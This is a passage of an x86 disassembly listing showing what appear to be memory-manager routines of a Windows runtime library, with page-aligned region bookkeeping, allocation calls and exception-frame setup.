  401644:	83 c4 e8             	add    $0xffffffe8,%esp
  401647:	89 14 24             	mov    %edx,(%esp)
  40164a:	8d 74 24 08          	lea    0x8(%esp),%esi
  40164e:	8d 7c 24 04          	lea    0x4(%esp),%edi
  401652:	8d 5c 24 0c          	lea    0xc(%esp),%ebx
  401656:	8b d0                	mov    %eax,%edx
  401658:	8b ea                	mov    %edx,%ebp
  40165a:	81 c5 ff 0f 00 00    	add    $0xfff,%ebp
  401660:	81 e5 00 f0 ff ff    	and    $0xfffff000,%ebp
  401666:	89 6c 24 10          	mov    %ebp,0x10(%esp)
  40166a:	03 14 24             	add    (%esp),%edx
  40166d:	81 e2 00 f0 ff ff    	and    $0xfffff000,%edx
  401673:	89 54 24 14          	mov    %edx,0x14(%esp)
  401677:	8b 44 24 10          	mov    0x10(%esp),%eax
  40167b:	89 01                	mov    %eax,(%ecx)
  40167d:	8b 44 24 14          	mov    0x14(%esp),%eax
  401681:	2b 44 24 10          	sub    0x10(%esp),%eax
  401685:	89 41 04             	mov    %eax,0x4(%ecx)
  401688:	a1 d4 b5 40 00       	mov    0x40b5d4,%eax
  40168d:	89 07                	mov    %eax,(%edi)
  40168f:	eb 58                	jmp    0x4016e9
  401691:	8b 07                	mov    (%edi),%eax
  401693:	8b 40 08             	mov    0x8(%eax),%eax
  401696:	89 06                	mov    %eax,(%esi)
  401698:	8b 07                	mov    (%edi),%eax
  40169a:	8b 40 0c             	mov    0xc(%eax),%eax
  40169d:	03 06                	add    (%esi),%eax
  40169f:	89 03                	mov    %eax,(%ebx)
  4016a1:	8b 06                	mov    (%esi),%eax
  4016a3:	3b 44 24 10          	cmp    0x10(%esp),%eax
  4016a7:	73 06                	jae    0x4016af
  4016a9:	8b 44 24 10          	mov    0x10(%esp),%eax
  4016ad:	89 06                	mov    %eax,(%esi)
  4016af:	8b 03                	mov    (%ebx),%eax
  4016b1:	3b 44 24 14          	cmp    0x14(%esp),%eax
  4016b5:	76 06                	jbe    0x4016bd
  4016b7:	8b 44 24 14          	mov    0x14(%esp),%eax
  4016bb:	89 03                	mov    %eax,(%ebx)
  4016bd:	8b 06                	mov    (%esi),%eax
  4016bf:	3b 03                	cmp    (%ebx),%eax
  4016c1:	73 20                	jae    0x4016e3
  4016c3:	68 00 40 00 00       	push   $0x4000
  4016c8:	8b 03                	mov    (%ebx),%eax
  4016ca:	2b 06                	sub    (%esi),%eax
  4016cc:	50                   	push   %eax
  4016cd:	8b 06                	mov    (%esi),%eax
  4016cf:	50                   	push   %eax
  4016d0:	e8 77 fa ff ff       	call   0x40114c
  4016d5:	85 c0                	test   %eax,%eax
  4016d7:	75 0a                	jne    0x4016e3
  4016d9:	c7 05 b0 b5 40 00 02 	movl   $0x2,0x40b5b0
  4016e0:	00 00 00 
  4016e3:	8b 07                	mov    (%edi),%eax
  4016e5:	8b 00                	mov    (%eax),%eax
  4016e7:	89 07                	mov    %eax,(%edi)
  4016e9:	b8 d4 b5 40 00       	mov    $0x40b5d4,%eax
  4016ee:	3b 07                	cmp    (%edi),%eax
  4016f0:	75 9f                	jne    0x401691
  4016f2:	83 c4 18             	add    $0x18,%esp
  4016f5:	5d                   	pop    %ebp
  4016f6:	5f                   	pop    %edi
  4016f7:	5e                   	pop    %esi
  4016f8:	5b                   	pop    %ebx
  4016f9:	c3                   	ret
  4016fa:	8b c0                	mov    %eax,%eax
  4016fc:	53                   	push   %ebx
  4016fd:	56                   	push   %esi
  4016fe:	57                   	push   %edi
  4016ff:	55                   	push   %ebp
  401700:	83 c4 f4             	add    $0xfffffff4,%esp
  401703:	8b da                	mov    %edx,%ebx
  401705:	8b f0                	mov    %eax,%esi
  401707:	8b fc                	mov    %esp,%edi
  401709:	bd e4 b5 40 00       	mov    $0x40b5e4,%ebp
  40170e:	81 c6 ff 3f 00 00    	add    $0x3fff,%esi
  401714:	81 e6 00 c0 ff ff    	and    $0xffffc000,%esi
  40171a:	8b 45 00             	mov    0x0(%ebp),%eax
  40171d:	89 07                	mov    %eax,(%edi)
  40171f:	eb 41                	jmp    0x401762
  401721:	8b 07                	mov    (%edi),%eax
  401723:	3b 70 0c             	cmp    0xc(%eax),%esi
  401726:	7f 34                	jg     0x40175c
  401728:	8b cb                	mov    %ebx,%ecx
  40172a:	8b 07                	mov    (%edi),%eax
  40172c:	8b 40 08             	mov    0x8(%eax),%eax
  40172f:	8b d6                	mov    %esi,%edx
  401731:	e8 4a fe ff ff       	call   0x401580
  401736:	83 3b 00             	cmpl   $0x0,(%ebx)
  401739:	74 5f                	je     0x40179a
  40173b:	8b 43 04             	mov    0x4(%ebx),%eax
  40173e:	8b 17                	mov    (%edi),%edx
  401740:	01 42 08             	add    %eax,0x8(%edx)
  401743:	8b 43 04             	mov    0x4(%ebx),%eax
  401746:	8b 17                	mov    (%edi),%edx
  401748:	29 42 0c             	sub    %eax,0xc(%edx)
  40174b:	8b 07                	mov    (%edi),%eax
  40174d:	83 78 0c 00          	cmpl   $0x0,0xc(%eax)
  401751:	75 47                	jne    0x40179a
  401753:	8b 07                	mov    (%edi),%eax
  401755:	e8 02 fb ff ff       	call   0x40125c
  40175a:	eb 3e                	jmp    0x40179a
  40175c:	8b 07                	mov    (%edi),%eax
  40175e:	8b 00                	mov    (%eax),%eax
  401760:	89 07                	mov    %eax,(%edi)
  401762:	3b 2f                	cmp    (%edi),%ebp
  401764:	75 bb                	jne    0x401721
  401766:	8b d3                	mov    %ebx,%edx
  401768:	8b c6                	mov    %esi,%eax
  40176a:	e8 6d fc ff ff       	call   0x4013dc
  40176f:	83 3b 00             	cmpl   $0x0,(%ebx)
  401772:	74 26                	je     0x40179a
  401774:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  401778:	8b d3                	mov    %ebx,%edx
  40177a:	8b c5                	mov    %ebp,%eax
  40177c:	e8 0f fb ff ff       	call   0x401290
  401781:	83 7c 24 04 00       	cmpl   $0x0,0x4(%esp)
  401786:	75 92                	jne    0x40171a
  401788:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  40178c:	8b 53 04             	mov    0x4(%ebx),%edx
  40178f:	8b 03                	mov    (%ebx),%eax
  401791:	e8 22 fd ff ff       	call   0x4014b8
  401796:	33 c0                	xor    %eax,%eax
  401798:	89 03                	mov    %eax,(%ebx)
  40179a:	83 c4 0c             	add    $0xc,%esp
  40179d:	5d                   	pop    %ebp
  40179e:	5f                   	pop    %edi
  40179f:	5e                   	pop    %esi
  4017a0:	5b                   	pop    %ebx
  4017a1:	c3                   	ret
  4017a2:	8b c0                	mov    %eax,%eax
  4017a4:	53                   	push   %ebx
  4017a5:	56                   	push   %esi
  4017a6:	57                   	push   %edi
  4017a7:	55                   	push   %ebp
  4017a8:	83 c4 e8             	add    $0xffffffe8,%esp
  4017ab:	89 0c 24             	mov    %ecx,(%esp)
  4017ae:	8b fa                	mov    %edx,%edi
  4017b0:	8b d8                	mov    %eax,%ebx
  4017b2:	8d 74 24 04          	lea    0x4(%esp),%esi
  4017b6:	bd e4 b5 40 00       	mov    $0x40b5e4,%ebp
  4017bb:	81 c7 ff 3f 00 00    	add    $0x3fff,%edi
  4017c1:	81 e7 00 c0 ff ff    	and    $0xffffc000,%edi
  4017c7:	8b 45 00             	mov    0x0(%ebp),%eax
  4017ca:	89 06                	mov    %eax,(%esi)
  4017cc:	eb 06                	jmp    0x4017d4
  4017ce:	8b 06                	mov    (%esi),%eax
  4017d0:	8b 00                	mov    (%eax),%eax
  4017d2:	89 06                	mov    %eax,(%esi)
  4017d4:	3b 2e                	cmp    (%esi),%ebp
  4017d6:	74 07                	je     0x4017df
  4017d8:	8b 06                	mov    (%esi),%eax
  4017da:	3b 58 08             	cmp    0x8(%eax),%ebx
  4017dd:	75 ef                	jne    0x4017ce
  4017df:	8b 06                	mov    (%esi),%eax
  4017e1:	3b 58 08             	cmp    0x8(%eax),%ebx
  4017e4:	75 5f                	jne    0x401845
  4017e6:	8b 06                	mov    (%esi),%eax
  4017e8:	3b 78 0c             	cmp    0xc(%eax),%edi
  4017eb:	0f 8e 9c 00 00 00    	jle    0x40188d
  4017f1:	8b 06                	mov    (%esi),%eax
  4017f3:	8b d7                	mov    %edi,%edx
  4017f5:	2b 50 0c             	sub    0xc(%eax),%edx
  4017f8:	8b 06                	mov    (%esi),%eax
  4017fa:	8b 40 08             	mov    0x8(%eax),%eax
  4017fd:	8b 0e                	mov    (%esi),%ecx
  4017ff:	03 41 0c             	add    0xc(%ecx),%eax
  401802:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  401806:	e8 35 fc ff ff       	call   0x401440
  40180b:	83 7c 24 08 00       	cmpl   $0x0,0x8(%esp)
  401810:	74 33                	je     0x401845
  401812:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  401816:	8d 54 24 08          	lea    0x8(%esp),%edx
  40181a:	8b c5                	mov    %ebp,%eax
  40181c:	e8 6f fa ff ff       	call   0x401290
  401821:	83 7c 24 10 00       	cmpl   $0x0,0x10(%esp)
  401826:	75 9f                	jne    0x4017c7
  401828:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  40182c:	8b 54 24 0c          	mov    0xc(%esp),%edx
  401830:	8b 44 24 08          	mov    0x8(%esp),%eax
  401834:	e8 7f fc ff ff       	call   0x4014b8
  401839:	8b 04 24             	mov    (%esp),%eax
  40183c:	33 d2                	xor    %edx,%edx
  40183e:	89 10                	mov    %edx,(%eax)
  401840:	e9 9a 00 00 00       	jmp    0x4018df
  401845:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  401849:	8b d7                	mov    %edi,%edx
  40184b:	8b c3                	mov    %ebx,%eax
  40184d:	e8 ee fb ff ff       	call   0x401440
  401852:	83 7c 24 08 00       	cmpl   $0x0,0x8(%esp)
  401857:	74 34                	je     0x40188d
  401859:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  40185d:	8d 54 24 08          	lea    0x8(%esp),%edx
  401861:	8b c5                	mov    %ebp,%eax
  401863:	e8 28 fa ff ff       	call   0x401290
  401868:	83 7c 24 10 00       	cmpl   $0x0,0x10(%esp)
  40186d:	0f 85 54 ff ff ff    	jne    0x4017c7
  401873:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  401877:	8b 54 24 0c          	mov    0xc(%esp),%edx
  40187b:	8b 44 24 08          	mov    0x8(%esp),%eax
  40187f:	e8 34 fc ff ff       	call   0x4014b8
  401884:	8b 04 24             	mov    (%esp),%eax
  401887:	33 d2                	xor    %edx,%edx
  401889:	89 10                	mov    %edx,(%eax)
  40188b:	eb 52                	jmp    0x4018df
  40188d:	8b 06                	mov    (%esi),%eax
  40188f:	8b 68 08             	mov    0x8(%eax),%ebp
  401892:	3b dd                	cmp    %ebp,%ebx
  401894:	75 42                	jne    0x4018d8
  401896:	8b 06                	mov    (%esi),%eax
  401898:	3b 78 0c             	cmp    0xc(%eax),%edi
  40189b:	7f 3b                	jg     0x4018d8
  40189d:	8b 0c 24             	mov    (%esp),%ecx
  4018a0:	8b c5                	mov    %ebp,%eax
  4018a2:	8b d7                	mov    %edi,%edx
  4018a4:	e8 d7 fc ff ff       	call   0x401580
  4018a9:	8b 04 24             	mov    (%esp),%eax
  4018ac:	83 38 00             	cmpl   $0x0,(%eax)
  4018af:	74 2e                	je     0x4018df
  4018b1:	8b 04 24             	mov    (%esp),%eax
  4018b4:	8b 40 04             	mov    0x4(%eax),%eax
  4018b7:	8b 16                	mov    (%esi),%edx
  4018b9:	01 42 08             	add    %eax,0x8(%edx)
  4018bc:	8b 04 24             	mov    (%esp),%eax
  4018bf:	8b 40 04             	mov    0x4(%eax),%eax
  4018c2:	8b 16                	mov    (%esi),%edx
  4018c4:	29 42 0c             	sub    %eax,0xc(%edx)
  4018c7:	8b 06                	mov    (%esi),%eax
  4018c9:	83 78 0c 00          	cmpl   $0x0,0xc(%eax)
  4018cd:	75 10                	jne    0x4018df
  4018cf:	8b 06                	mov    (%esi),%eax
  4018d1:	e8 86 f9 ff ff       	call   0x40125c
  4018d6:	eb 07                	jmp    0x4018df
  4018d8:	8b 04 24             	mov    (%esp),%eax
  4018db:	33 d2                	xor    %edx,%edx
  4018dd:	89 10                	mov    %edx,(%eax)
  4018df:	83 c4 18             	add    $0x18,%esp
  4018e2:	5d                   	pop    %ebp
  4018e3:	5f                   	pop    %edi
  4018e4:	5e                   	pop    %esi
  4018e5:	5b                   	pop    %ebx
  4018e6:	c3                   	ret
  4018e7:	90                   	nop
  4018e8:	53                   	push   %ebx
  4018e9:	83 c4 e8             	add    $0xffffffe8,%esp
  4018ec:	8b d9                	mov    %ecx,%ebx
  4018ee:	8d 88 ff 3f 00 00    	lea    0x3fff(%eax),%ecx
  4018f4:	81 e1 00 c0 ff ff    	and    $0xffffc000,%ecx
  4018fa:	89 0c 24             	mov    %ecx,(%esp)
  4018fd:	03 d0                	add    %eax,%edx
  4018ff:	81 e2 00 c0 ff ff    	and    $0xffffc000,%edx
  401905:	89 54 24 04          	mov    %edx,0x4(%esp)
  401909:	8b 44 24 04          	mov    0x4(%esp),%eax
  40190d:	3b 04 24             	cmp    (%esp),%eax
  401910:	76 5f                	jbe    0x401971
  401912:	8b cb                	mov    %ebx,%ecx
  401914:	8b 54 24 04          	mov    0x4(%esp),%edx
  401918:	2b 14 24             	sub    (%esp),%edx
  40191b:	8b 04 24             	mov    (%esp),%eax
  40191e:	e8 1d fd ff ff       	call   0x401640
  401923:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  401927:	8b d3                	mov    %ebx,%edx
  401929:	b8 e4 b5 40 00       	mov    $0x40b5e4,%eax
  40192e:	e8 5d f9 ff ff       	call   0x401290
  401933:	8b 5c 24 08          	mov    0x8(%esp),%ebx
  401937:	85 db                	test   %ebx,%ebx
  401939:	74 1f                	je     0x40195a
  40193b:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  40193f:	8b 54 24 0c          	mov    0xc(%esp),%edx
  401943:	8b c3                	mov    %ebx,%eax
  401945:	e8 6e fb ff ff       	call   0x4014b8
  40194a:	8b 44 24 10          	mov    0x10(%esp),%eax
  40194e:	89 44 24 08          	mov    %eax,0x8(%esp)
  401952:	8b 44 24 14          	mov    0x14(%esp),%eax
  401956:	89 44 24 0c          	mov    %eax,0xc(%esp)
  40195a:	83 7c 24 08 00       	cmpl   $0x0,0x8(%esp)
  40195f:	74 14                	je     0x401975
  401961:	8d 54 24 08          	lea    0x8(%esp),%edx
  401965:	b8 e4 b5 40 00       	mov    $0x40b5e4,%eax
  40196a:	e8 a9 f9 ff ff       	call   0x401318
  40196f:	eb 04                	jmp    0x401975
  401971:	33 c0                	xor    %eax,%eax
  401973:	89 03                	mov    %eax,(%ebx)
  401975:	83 c4 18             	add    $0x18,%esp
  401978:	5b                   	pop    %ebx
  401979:	c3                   	ret
  40197a:	8b c0                	mov    %eax,%eax
  40197c:	55                   	push   %ebp
  40197d:	8b ec                	mov    %esp,%ebp
  40197f:	51                   	push   %ecx
  401980:	33 d2                	xor    %edx,%edx
  401982:	55                   	push   %ebp
  401983:	68 44 1a 40 00       	push   $0x401a44
  401988:	64 ff 32             	push   %fs:(%edx)
  40198b:	64 89 22             	mov    %esp,%fs:(%edx)
  40198e:	68 b4 b5 40 00       	push   $0x40b5b4
  401993:	e8 bc f7 ff ff       	call   0x401154
  401998:	80 3d 35 b0 40 00 00 	cmpb   $0x0,0x40b035
  40199f:	74 0a                	je     0x4019ab
  4019a1:	68 b4 b5 40 00       	push   $0x40b5b4
  4019a6:	e8 b1 f7 ff ff       	call   0x40115c
  4019ab:	b8 d4 b5 40 00       	mov    $0x40b5d4,%eax
  4019b0:	e8 43 f8 ff ff       	call   0x4011f8
  4019b5:	b8 e4 b5 40 00       	mov    $0x40b5e4,%eax
  4019ba:	e8 39 f8 ff ff       	call   0x4011f8
  4019bf:	b8 10 b6 40 00       	mov    $0x40b610,%eax
  4019c4:	e8 2f f8 ff ff       	call   0x4011f8
  4019c9:	68 f8 0f 00 00       	push   $0xff8
  4019ce:	6a 00                	push   $0x0
  4019d0:	e8 5f f7 ff ff       	call   0x401134
  4019d5:	a3 0c b6 40 00       	mov    %eax,0x40b60c
  4019da:	83 3d 0c b6 40 00 00 	cmpl   $0x0,0x40b60c
  4019e1:	74 40                	je     0x401a23
  4019e3:	b8 03 00 00 00       	mov    $0x3,%eax
  4019e8:	8b 15 0c b6 40 00    	mov    0x40b60c,%edx
  4019ee:	33 c9                	xor    %ecx,%ecx
  4019f0:	89 4c 82 f4          	mov    %ecx,-0xc(%edx,%eax,4)
  4019f4:	40                   	inc    %eax
  4019f5:	3d 01 04 00 00       	cmp    $0x401,%eax
  4019fa:	75 ec                	jne    0x4019e8
  4019fc:	c7 45 fc f4 b5 40 00 	movl   $0x40b5f4,-0x4(%ebp)
  401a03:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401a06:	8b 55 fc             	mov    -0x4(%ebp),%edx
  401a09:	89 50 04             	mov    %edx,0x4(%eax)
  401a0c:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401a0f:	8b 55 fc             	mov    -0x4(%ebp),%edx
  401a12:	89 10                	mov    %edx,(%eax)
  401a14:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401a17:	a3 00 b6 40 00       	mov    %eax,0x40b600
  401a1c:	c6 05 ac b5 40 00 01 	movb   $0x1,0x40b5ac
  401a23:	33 c0                	xor    %eax,%eax
  401a25:	5a                   	pop    %edx
  401a26:	59                   	pop    %ecx
  401a27:	59                   	pop    %ecx
  401a28:	64 89 10             	mov    %edx,%fs:(%eax)
  401a2b:	68 4b 1a 40 00       	push   $0x401a4b
  401a30:	80 3d 35 b0 40 00 00 	cmpb   $0x0,0x40b035
  401a37:	74 0a                	je     0x401a43
  401a39:	68 b4 b5 40 00       	push   $0x40b5b4
  401a3e:	e8 21 f7 ff ff       	call   0x401164
  401a43:	c3                   	ret
  401a44:	e9 7b 17 00 00       	jmp    0x4031c4
  401a49:	eb e5                	jmp    0x401a30
  401a4b:	a0 ac b5 40 00       	mov    0x40b5ac,%al
  401a50:	59                   	pop    %ecx
  401a51:	5d                   	pop    %ebp
  401a52:	c3                   	ret
  401a53:	90                   	nop
  401a54:	55                   	push   %ebp
  401a55:	8b ec                	mov    %esp,%ebp
  401a57:	83 c4 f8             	add    $0xfffffff8,%esp
  401a5a:	80 3d ac b5 40 00 00 	cmpb   $0x0,0x40b5ac
  401a61:	0f 84 e8 00 00 00    	je     0x401b4f
  401a67:	33 c0                	xor    %eax,%eax
  401a69:	55                   	push   %ebp
  401a6a:	68 48 1b 40 00       	push   $0x401b48
  401a6f:	64 ff 30             	push   %fs:(%eax)
  401a72:	64 89 20             	mov    %esp,%fs:(%eax)
  401a75:	80 3d 35 b0 40 00 00 	cmpb   $0x0,0x40b035
  401a7c:	74 0a                	je     0x401a88
  401a7e:	68 b4 b5 40 00       	push   $0x40b5b4
  401a83:	e8 d4 f6 ff ff       	call   0x40115c
  401a88:	c6 05 ac b5 40 00 00 	movb   $0x0,0x40b5ac
  401a8f:	a1 0c b6 40 00       	mov    0x40b60c,%eax
  401a94:	50                   	push   %eax
  401a95:	e8 a2 f6 ff ff       	call   0x40113c
  401a9a:	33 c0                	xor    %eax,%eax
  401a9c:	a3 0c b6 40 00       	mov    %eax,0x40b60c
  401aa1:	a1 d4 b5 40 00       	mov    0x40b5d4,%eax
  401aa6:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401aa9:	eb 1b                	jmp    0x401ac6
  401aab:	68 00 80 00 00       	push   $0x8000
  401ab0:	6a 00                	push   $0x0
  401ab2:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401ab5:	8b 40 08             	mov    0x8(%eax),%eax
  401ab8:	50                   	push   %eax
  401ab9:	e8 8e f6 ff ff       	call   0x40114c
  401abe:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401ac1:	8b 00                	mov    (%eax),%eax
  401ac3:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401ac6:	b8 d4 b5 40 00       	mov    $0x40b5d4,%eax
  401acb:	3b 45 f8             	cmp    -0x8(%ebp),%eax
  401ace:	75 db                	jne    0x401aab
  401ad0:	b8 d4 b5 40 00       	mov    $0x40b5d4,%eax
  401ad5:	e8 1e f7 ff ff       	call   0x4011f8
  401ada:	b8 e4 b5 40 00       	mov    $0x40b5e4,%eax
  401adf:	e8 14 f7 ff ff       	call   0x4011f8
  401ae4:	b8 10 b6 40 00       	mov    $0x40b610,%eax
  401ae9:	e8 0a f7 ff ff       	call   0x4011f8
  401aee:	a1 cc b5 40 00       	mov    0x40b5cc,%eax
  401af3:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401af6:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  401afa:	74 21                	je     0x401b1d
  401afc:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401aff:	8b 00                	mov    (%eax),%eax
  401b01:	a3 cc b5 40 00       	mov    %eax,0x40b5cc
  401b06:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401b09:	50                   	push   %eax
  401b0a:	e8 2d f6 ff ff       	call   0x40113c
  401b0f:	a1 cc b5 40 00       	mov    0x40b5cc,%eax
  401b14:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401b17:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  401b1b:	75 df                	jne    0x401afc
  401b1d:	33 c0                	xor    %eax,%eax
  401b1f:	5a                   	pop    %edx
  401b20:	59                   	pop    %ecx
  401b21:	59                   	pop    %ecx
  401b22:	64 89 10             	mov    %edx,%fs:(%eax)
  401b25:	68 4f 1b 40 00       	push   $0x401b4f
  401b2a:	80 3d 35 b0 40 00 00 	cmpb   $0x0,0x40b035
  401b31:	74 0a                	je     0x401b3d
  401b33:	68 b4 b5 40 00       	push   $0x40b5b4
  401b38:	e8 27 f6 ff ff       	call   0x401164
  401b3d:	68 b4 b5 40 00       	push   $0x40b5b4
  401b42:	e8 25 f6 ff ff       	call   0x40116c
  401b47:	c3                   	ret
  401b48:	e9 77 16 00 00       	jmp    0x4031c4
  401b4d:	eb db                	jmp    0x401b2a
  401b4f:	59                   	pop    %ecx
  401b50:	59                   	pop    %ecx
  401b51:	5d                   	pop    %ebp
  401b52:	c3                   	ret
  401b53:	90                   	nop
  401b54:	53                   	push   %ebx
  401b55:	83 c4 f8             	add    $0xfffffff8,%esp
  401b58:	3b 05 00 b6 40 00    	cmp    0x40b600,%eax
  401b5e:	75 09                	jne    0x401b69
  401b60:	8b 50 04             	mov    0x4(%eax),%edx
  401b63:	89 15 00 b6 40 00    	mov    %edx,0x40b600
  401b69:	8b 50 04             	mov    0x4(%eax),%edx
  401b6c:	89 14 24             	mov    %edx,(%esp)
  401b6f:	8b 50 08             	mov    0x8(%eax),%edx
  401b72:	81 fa 00 10 00 00    	cmp    $0x1000,%edx
  401b78:	7f 4e                	jg     0x401bc8
  401b7a:	3b 04 24             	cmp    (%esp),%eax
  401b7d:	75 17                	jne    0x401b96
  401b7f:	85 d2                	test   %edx,%edx
  401b81:	79 03                	jns    0x401b86
  401b83:	83 c2 03             	add    $0x3,%edx
  401b86:	c1 fa 02             	sar    $0x2,%edx
  401b89:	a1 0c b6 40 00       	mov    0x40b60c,%eax
  401b8e:	33 c9                	xor    %ecx,%ecx
  401b90:	89 4c 90 f4          	mov    %ecx,-0xc(%eax,%edx,4)
  401b94:	eb 4b                	jmp    0x401be1
  401b96:	85 d2                	test   %edx,%edx
  401b98:	79 03                	jns    0x401b9d
  401b9a:	83 c2 03             	add    $0x3,%edx
  401b9d:	c1 fa 02             	sar    $0x2,%edx
  401ba0:	8b 0d 0c b6 40 00    	mov    0x40b60c,%ecx
  401ba6:	8b 1c 24             	mov    (%esp),%ebx
  401ba9:	89 5c 91 f4          	mov    %ebx,-0xc(%ecx,%edx,4)
  401bad:	8b 00                	mov    (%eax),%eax
  401baf:	89 44 24 04          	mov    %eax,0x4(%esp)
  401bb3:	8b 04 24             	mov    (%esp),%eax
  401bb6:	8b 54 24 04          	mov    0x4(%esp),%edx
  401bba:	89 10                	mov    %edx,(%eax)
  401bbc:	8b 44 24 04          	mov    0x4(%esp),%eax
  401bc0:	8b 14 24             	mov    (%esp),%edx
  401bc3:	89 50 04             	mov    %edx,0x4(%eax)
  401bc6:	eb 19                	jmp    0x401be1
  401bc8:	8b 00                	mov    (%eax),%eax
  401bca:	89 44 24 04          	mov    %eax,0x4(%esp)
  401bce:	8b 04 24             	mov    (%esp),%eax
  401bd1:	8b 54 24 04          	mov    0x4(%esp),%edx
  401bd5:	89 10                	mov    %edx,(%eax)
  401bd7:	8b 44 24 04          	mov    0x4(%esp),%eax
  401bdb:	8b 14 24             	mov    (%esp),%edx
  401bde:	89 50 04             	mov    %edx,0x4(%eax)
  401be1:	59                   	pop    %ecx
  401be2:	5a                   	pop    %edx
  401be3:	5b                   	pop    %ebx
  401be4:	c3                   	ret
  401be5:	8d 40 00             	lea    0x0(%eax),%eax
  401be8:	53                   	push   %ebx
  401be9:	51                   	push   %ecx
  401bea:	8b cc                	mov    %esp,%ecx
  401bec:	8b 15 10 b6 40 00    	mov    0x40b610,%edx
  401bf2:	89 11                	mov    %edx,(%ecx)
  401bf4:	eb 18                	jmp    0x401c0e
  401bf6:	8b 11                	mov    (%ecx),%edx
  401bf8:	8b 52 08             	mov    0x8(%edx),%edx
  401bfb:	3b c2                	cmp    %edx,%eax
  401bfd:	72 09                	jb     0x401c08
  401bff:	8b 19                	mov    (%ecx),%ebx
  401c01:	03 53 0c             	add    0xc(%ebx),%edx
  401c04:	3b c2                	cmp    %edx,%eax
  401c06:	72 1d                	jb     0x401c25
  401c08:	8b 11                	mov    (%ecx),%edx
  401c0a:	8b 12                	mov    (%edx),%edx
  401c0c:	89 11                	mov    %edx,(%ecx)
  401c0e:	ba 10 b6 40 00       	mov    $0x40b610,%edx
  401c13:	3b 11                	cmp    (%ecx),%edx
  401c15:	75 df                	jne    0x401bf6
  401c17:	c7 05 b0 b5 40 00 03 	movl   $0x3,0x40b5b0
  401c1e:	00 00 00 
  401c21:	33 c0                	xor    %eax,%eax
  401c23:	89 01                	mov    %eax,(%ecx)
  401c25:	8b 01                	mov    (%ecx),%eax
  401c27:	5a                   	pop    %edx
  401c28:	5b                   	pop    %ebx
  401c29:	c3                   	ret
  401c2a:	8b c0                	mov    %eax,%eax
  401c2c:	53                   	push   %ebx
  401c2d:	51                   	push   %ecx
  401c2e:	8b ca                	mov    %edx,%ecx
  401c30:	83 e9 04             	sub    $0x4,%ecx
  401c33:	8d 1c 01             	lea    (%ecx,%eax,1),%ebx
  401c36:	89 1c 24             	mov    %ebx,(%esp)
  401c39:	83 fa 10             	cmp    $0x10,%edx
  401c3c:	7c 13                	jl     0x401c51
  401c3e:	8b 14 24             	mov    (%esp),%edx
  401c41:	c7 02 07 00 00 80    	movl   $0x80000007,(%edx)
  401c47:	8b d1                	mov    %ecx,%edx
  401c49:	e8 da 01 00 00       	call   0x401e28
  401c4e:	5a                   	pop    %edx
  401c4f:	5b                   	pop    %ebx
  401c50:	c3                   	ret
  401c51:	83 fa 04             	cmp    $0x4,%edx
  401c54:	7c 0f                	jl     0x401c65
  401c56:	8b ca                	mov    %edx,%ecx
  401c58:	81 c9 02 00 00 80    	or     $0x80000002,%ecx
  401c5e:	89 08                	mov    %ecx,(%eax)
  401c60:	8b 04 24             	mov    (%esp),%eax
  401c63:	89 08                	mov    %ecx,(%eax)
  401c65:	5a                   	pop    %edx
  401c66:	5b                   	pop    %ebx
  401c67:	c3                   	ret
  401c68:	ff 05 9c b5 40 00    	incl   0x40b59c
  401c6e:	8b d0                	mov    %eax,%edx
  401c70:	83 ea 04             	sub    $0x4,%edx
  401c73:	8b 12                	mov    (%edx),%edx
  401c75:	81 e2 fc ff ff 7f    	and    $0x7ffffffc,%edx
  401c7b:	83 ea 04             	sub    $0x4,%edx
  401c7e:	01 15 a0 b5 40 00    	add    %edx,0x40b5a0
  401c84:	e8 fb 06 00 00       	call   0x402384
  401c89:	c3                   	ret
  401c8a:	8b c0                	mov    %eax,%eax
  401c8c:	83 fa 0c             	cmp    $0xc,%edx
  401c8f:	7c 0e                	jl     0x401c9f
  401c91:	83 ca 02             	or     $0x2,%edx
  401c94:	89 10                	mov    %edx,(%eax)
  401c96:	83 c0 04             	add    $0x4,%eax
  401c99:	e8 ca ff ff ff       	call   0x401c68
  401c9e:	c3                   	ret
  401c9f:	83 fa 04             	cmp    $0x4,%edx
  401ca2:	7c 0a                	jl     0x401cae
  401ca4:	8b ca                	mov    %edx,%ecx
  401ca6:	81 c9 02 00 00 80    	or     $0x80000002,%ecx
  401cac:	89 08                	mov    %ecx,(%eax)
  401cae:	03 c2                	add    %edx,%eax
  401cb0:	83 20 fe             	andl   $0xfffffffe,(%eax)
  401cb3:	c3                   	ret
  401cb4:	53                   	push   %ebx
  401cb5:	56                   	push   %esi
  401cb6:	51                   	push   %ecx
  401cb7:	8b d0                	mov    %eax,%edx
  401cb9:	83 ea 04             	sub    $0x4,%edx
  401cbc:	8b 12                	mov    (%edx),%edx
  401cbe:	8b ca                	mov    %edx,%ecx
  401cc0:	81 e1 02 00 00 80    	and    $0x80000002,%ecx
  401cc6:	81 f9 02 00 00 80    	cmp    $0x80000002,%ecx
  401ccc:	74 0a                	je     0x401cd8
  401cce:	c7 05 b0 b5 40 00 04 	movl   $0x4,0x40b5b0
  401cd5:	00 00 00 
  401cd8:	8b da                	mov    %edx,%ebx
  401cda:	81 e3 fc ff ff 7f    	and    $0x7ffffffc,%ebx
  401ce0:	2b c3                	sub    %ebx,%eax
  401ce2:	8b c8                	mov    %eax,%ecx
  401ce4:	33 11                	xor    (%ecx),%edx
  401ce6:	f7 c2 fe ff ff ff    	test   $0xfffffffe,%edx
